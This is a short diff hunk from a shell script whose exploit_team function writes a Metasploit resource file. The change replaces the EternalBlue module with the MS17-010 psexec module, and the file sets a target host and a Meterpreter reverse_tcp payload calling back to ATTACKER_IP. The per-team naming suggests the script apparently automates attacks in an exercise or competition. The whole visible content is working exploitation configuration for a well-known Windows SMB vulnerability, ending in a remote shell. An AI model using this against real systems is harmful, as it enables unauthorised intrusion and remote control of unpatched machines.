@@ -121,7 +121,7 @@ exploit_team() {
   # Generate Metasploit resource file
   local RC_FILE="ligo_team${TEAM}.rc"
   cat > "$RC_FILE" << EOF
-use exploit/windows/smb/ms17_010_eternalblue
+use windows/smb/ms17_010_psexec
 set RHOSTS ${TARGET}
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
 set LHOST ${ATTACKER_IP}
